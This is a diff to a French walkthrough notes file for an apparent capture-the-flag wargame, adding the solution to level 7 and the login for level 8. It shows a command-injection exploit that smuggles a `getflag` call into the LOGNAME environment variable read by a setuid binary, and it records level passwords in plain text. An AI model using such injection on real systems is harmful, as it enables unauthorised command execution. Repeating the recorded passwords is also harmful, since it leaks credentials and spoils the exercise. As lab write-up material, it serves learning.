@@ -92,6 +92,19 @@ wiok45aaoguiboiki2tuin6ub
 # level 7
 su level07:wiok45aaoguiboiki2tuin6ub
 
+en desassemblant le binaire on voit qu'il y a un exec et qu'il y a  une string `/bin/echo %s` on voit aussi qu'il appelle une variable d'env avec la fonction getenv
+
+l'env qui est visible grace a la fonction strings c'est LOGNAME
+export LOGNAME=\`getflag\`
+./level07
+
+fiumuikeil55xe9cu4dood66h
+
+# level 8
+
+su level08:fiumuikeil55xe9cu4dood66h
+
+
 
 
 
